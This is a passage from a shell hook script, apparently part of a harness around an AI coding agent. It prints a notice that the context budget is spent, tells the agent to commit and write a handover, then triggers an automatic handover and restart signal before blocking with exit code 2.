        echo "" >&2
        echo "  Action: Commit your work, then run '$(_fw_cmd) handover'" >&2
        echo "  Under claude-fw the session ends when THIS turn ends (T-4032): wrap up now," >&2
        echo "  in this turn. A handover is written for you if you do not write one." >&2
        echo "  (Exception: a turn still running after 15 min, or a project whose Stop hooks are not wired, is ended at that ceiling.)" >&2
        echo "  Details: docs/context-compaction.md (budget ladder, what handover/compact capture)" >&2
        _supervision_notice
        echo "══════════════════════════════════════════════════════════" >&2
        echo "" >&2
        _start_auto_handover "$TOKENS"    # T-3989: PostToolUse never runs on a blocked call
        _write_restart_signal "$TOKENS"   # T-2403: arm autonomous restart
        exit 2
        ;;
esac
